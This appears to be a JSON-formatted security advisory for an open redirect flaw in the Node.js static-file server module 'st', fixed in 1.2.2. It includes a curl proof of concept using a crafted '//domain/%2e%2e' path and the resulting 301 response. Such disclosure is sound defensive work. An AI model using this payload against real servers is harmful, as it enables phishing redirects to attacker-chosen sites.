  "summary": "Open Redirect in st",
  "details": "st is a module for serving static files.\n\nAn attacker is able to craft a request that results in an `HTTP 301` (redirect) to an entirely different domain. \n\nA request for: `http://some.server.com//nodesecurity.org/%2e%2e` would result in a 301 to `//nodesecurity.org/%2e%2e` which most browsers treat as a proper redirect as `//` is translated into the current schema being used.\n\nMitigating factor: \n\nIn order for this to work, `st` must be serving from the root of a server (`/`) rather than the typical sub directory (`/static/`) and the redirect URL will end with some form of URL encoded `..` (\"%2e%2e\", \"%2e.\", \".%2e\"). \n\nCode example (provided by Xin Gao): \n\n[example.js]\n\n```\nvar st = require('st') \nvar http = require('http') \nhttp.createServer(st(process.cwd())).listen(1337)\n```\n\n```\n$ curl -v http://localhost:1337//cve.mitre.com/%2e%2e\n*   Trying ::1...\n* TCP_NODELAY set\n* Connected to localhost (::1) port 1337 (#0)\n> GET //cve.mitre.com/%2e%2e HTTP/1.1\n> Host: localhost:1337\n> User-Agent: curl/7.54.0\n> Accept: */*\n>\n< HTTP/1.1 301 Moved Permanently\n< cache-control: public, max-age=600\n< last-modified: Fri, 13 Oct 2017 22:56:33 GMT\n< etag: \"16777220-46488904-1507935393000\"\n< location: //cve.mitre.com/%2e%2e/\n< Date: Fri, 13 Oct 2017 22:56:41 GMT\n< Connection: keep-alive\n< Content-Length: 30\n<\n* Connection #0 to host localhost left intact\n```\n\n\n## Recommendation\n\nUpdate to version 1.2.2 or later.",
